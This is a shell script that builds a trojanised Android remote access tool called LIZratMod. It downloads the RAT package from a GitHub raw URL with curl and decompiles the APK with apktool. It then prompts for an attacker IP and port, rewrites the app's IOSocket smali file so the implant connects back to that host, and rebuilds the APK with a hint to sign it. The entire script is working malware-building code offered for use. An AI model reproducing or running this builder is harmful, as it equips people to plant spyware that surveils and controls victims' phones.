#!/bin/sh
Black='\033[0;30m'
Red='\033[0;31m'
Green='\033[0;32m'
IGreen='\033[0;92m'
Yellow='\033[0;33m'
IYellow='\033[0;93m'
Blue='\033[0;34m'
Purple='\033[0;35m'
Cyan='\033[0;36m'
White='\033[0;37m'
clear='\033[0m'

web() 
{
if [[ -e $HOME/LIZratMod/APK/decompiled.apk ]]
then
echo -e "[${Green}✔${clear}] ${Yellow}Checking...${clear}"
echo -e "[${Green}✔${clear}] ${Yellow}Directory found${clear}"
else
echo -e "[${Green}✔${clear}] ${Yellow}Directory not found. Wait...${clear}"
echo -e "[${Green}✔${clear}] ${Yellow}Calling files [github.com/efxtv]...${clear}"
echo -e "[${Green}✔${clear}] ${Yellow}Please wait... ${clear}"
curl -L -o $HOME/LIZratMod.zip https://raw.githubusercontent.com/efxtv/EFX-Tv-Bookmarks/main/bin/L3MONPro/LIZratMod.zip -q --progress-bar
unzip LIZratMod.zip > /dev/null 2>&1
echo -e "[${Green}✔${clear}] ${Yellow}Done...${clear}"
fi
}
web

smaliFile="LIZratMod/APK/decompiled/smali_classes4/com/Liz0rd/lizrat/IOSocket.smali"

#if [ -d $HOME/LizRatPro ]; then
rm -rf LIZratMod/APK/decompiled
apktool d LIZratMod/APK/decompiled.apk -o LIZratMod/APK/decompiled
    appPath="LIZratMod/APK/decompiled"
#fi

read -p "   💎️ IP    :" host
read -p "   💎️ Port  :" port

sed -i "s#http.*#http://$host:$port?model=\"#" $smaliFile

apktool b "$appPath" -o $PWD/Created-LizP.apk
echo -e "   Done --out $PWD/Created-LizP.apk"
echo -e "   ${Yellow}Use command to sign
   ${Green}emsf sign Created-LizP.apk"

